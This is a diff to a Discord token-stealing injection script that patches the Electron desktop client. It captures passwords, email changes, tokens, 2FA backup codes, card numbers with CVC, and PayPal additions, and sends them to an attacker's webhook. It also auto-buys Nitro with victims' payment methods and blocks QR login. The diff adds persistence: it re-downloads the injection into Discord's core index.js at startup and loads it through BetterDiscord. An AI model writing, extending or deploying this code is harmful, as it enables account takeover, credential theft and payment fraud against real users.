@@ -7,11 +7,12 @@ const { BrowserWindow, session } = require('electron')
 const config = {
     auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal
     ping_on_run: false, //pings @everyone when you get a run/login
-    ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send it ping_on_run is true
+    ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
     embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
     embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
     embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
     webhook: '%WEBHOOK%', //your discord webhook there obviously
+    injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: 'https://discord.com/api/v9/users/@me',
     bin: 'https://dpaste.com/api/',
@@ -55,8 +56,6 @@ const config = {
             'https://discord.com/api/v*/applications/detectable', 
             'https://*.discord.com/api/v*/users/@me/library', 
             'https://discord.com/api/v*/users/@me/library', 
-            'https://*.discord.com/api/v*/users/@me/billing/subscriptions', 
-            'https://discord.com/api/v*/users/@me/billing/subscriptions',
             'wss://remote-auth-gateway.discord.gg/*',
         ]
     }
@@ -91,10 +90,11 @@ function updateCheck() {
     const resourceIndex = path.join(appPath, "index.js");
     const parentDir = path.resolve(path.resolve(__dirname, '..'), '..')
     const indexJs = `${parentDir}\\discord_desktop_core-2\\discord_desktop_core\\index.js`
+    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
     if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson, (err) => {});
     if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex, (err) => {});
-    
+
     if (process.platform === "win32" || process.platform === "darwin") {
         fs.writeFileSync(packageJson, JSON.stringify({
             name: "Discord-Injection",
@@ -102,14 +102,16 @@ function updateCheck() {
         }, null, 4));
 
         const startUpScript = `const fs = require('fs'), https = require('https');
-const fileSize = fs.statSync("${indexJs}").size
-fs.readFile('${indexJs}', 'utf8', (err, data) => {
+const indexJs = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
     if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
         init();
 })
 async function init() {
-    https.get('https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', (res) => {
-        const file = fs.createWriteStream('${indexJs}');
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJs);
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -119,7 +121,10 @@ async function init() {
         setTimeout(init(), 10000);
     });
 }
-require('${path.join(discordPath, "app.asar")}')`
+require('${path.join(discordPath, "app.asar")}')
+if (fs.existsSync(bdPath)) {
+    require(bdPath);
+}`
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
     }
     if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
@@ -307,7 +312,8 @@ const getBadges = (flags) => {
             break;
     }
     return badges
-}
+};
+
 const hooker = (content) => {
     execScript(`var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("POST", "${config.webhook}", true);
@@ -315,12 +321,13 @@ const hooker = (content) => {
     xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
     xmlHttp.send(JSON.stringify(${JSON.stringify(content)}));
 `)
-}
+};
+
 const login = async (email, password, token) => {
     const json = await getInfo(token);
     const nitro = getNitro(json.premium_type);
-    const badges = getBadges(json.flags)
-    const billing = await getBilling(token)
+    const badges = getBadges(json.flags);
+    const billing = await getBilling(token);
     const mfa = await getMfa(password, token);
     const content = {
         username: config.embed_name,
@@ -335,10 +342,10 @@ const login = async (email, password, token) => {
                         "inline": false
                     },
                     {
-                        "name": "**Other Info**",
+                        "name": "**Discord Info**",
                         "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
                         "inline": false
-                    },
+                    }, 
                     {
                         "name": "**Token**",
                         "value": `\`${token}\``,
@@ -357,13 +364,14 @@ const login = async (email, password, token) => {
     }
     if (config.ping_on_run) content['content'] = config.ping_val;
     hooker(content)
-}
+};
+
 const passwordChanged = async (oldpassword, newpassword, token) => {
     const json = await getInfo(token);
     const nitro = getNitro(json.premium_type);
-    const badges = getBadges(json.flags)
-    const billing = await getBilling(token)
-    const mfa = await getMfa(newpassword, token)
+    const badges = getBadges(json.flags);
+    const billing = await getBilling(token);
+    const mfa = await getMfa(newpassword, token);
     const content = {
         username: config.embed_name,
         avatar_url: config.embed_icon,
@@ -377,7 +385,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                         "inline": true
                     },
                     {
-                        "name": "**Other Info**",
+                        "name": "**Discord Info**",
                         "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
                         "inline": true
                     },
@@ -399,13 +407,14 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
     }
     if (config.ping_on_run) content['content'] = config.ping_val;
     hooker(content)
-}
+};
+
 const emailChanged = async (email, password, token) => {
     const json = await getInfo(token);
     const nitro = getNitro(json.premium_type);
-    const badges = getBadges(json.flags)
-    const billing = await getBilling(token)
-    const mfa = await getMfa(password, token)
+    const badges = getBadges(json.flags);
+    const billing = await getBilling(token);
+    const mfa = await getMfa(password, token);
     const content = {
         username: config.embed_name,
         avatar_url: config.embed_icon,
@@ -419,7 +428,7 @@ const emailChanged = async (email, password, token) => {
                         "inline": true
                     },
                     {
-                        "name": "**Other Info**",
+                        "name": "**Discord Info**",
                         "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
                         "inline": true
                     },
@@ -441,14 +450,14 @@ const emailChanged = async (email, password, token) => {
     }
     if (config.ping_on_run) content['content'] = config.ping_val;
     hooker(content)
-}
+};
 
 const PaypalAdded = async (token) => {
     const json = await getInfo(token);
     const nitro = getNitro(json.premium_type);
-    const badges = getBadges(json.flags)
-    const billing = getBilling(token)
-    const code = await buyNitro(token)
+    const badges = getBadges(json.flags);
+    const billing = getBilling(token);
+    const code = await buyNitro(token);
     const content = {
         username: config.embed_name,
         avatar_url: config.embed_icon,
@@ -462,7 +471,7 @@ const PaypalAdded = async (token) => {
                         "inline": false
                     },
                     {
-                        "name": "**Other Info**",
+                        "name": "**Discord Info**",
                         "value": `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
                         "inline": false
                     },
@@ -484,7 +493,8 @@ const PaypalAdded = async (token) => {
     }
     if (config.ping_on_run) content['content'] = config.ping_val;
     hooker(content)
-}
+};
+
 const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
     const json = await getInfo(token);
     const nitro = getNitro(json.premium_type);
@@ -504,7 +514,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
                         "inline": true
                     },
                     {
-                        "name": "**Other Info**",
+                        "name": "**Discord Info**",
                         "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                         "inline": true
                     },
@@ -531,10 +541,10 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
     }
     if (config.ping_on_run) content['content'] = config.ping_val;
     hooker(content)
-}
+};
 
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
-    if (details.url.startsWith("wss://")) {
+    if (details.url.startsWith("wss://remote-auth-gateway")) {
         callback({
             cancel: true
         })
@@ -544,7 +554,7 @@ session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, call
 
     callback({})
     return;
-})
+});
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
     if (details.url.startsWith(config.webhook)) {
@@ -574,9 +584,10 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
             }
         })
     }
-})
+});
 
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
+    if (details.statusCode !== 200 && details.statusCode !== 202) return;
     const unparsedData = details.uploadData[0].bytes
     const data = JSON.parse(Buffer.from(unparsedData).toString())
     const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`)
@@ -607,4 +618,4 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
             break;
     }
 });
-module.exports = require('./core.asar')
+module.exports = require('./core.asar');
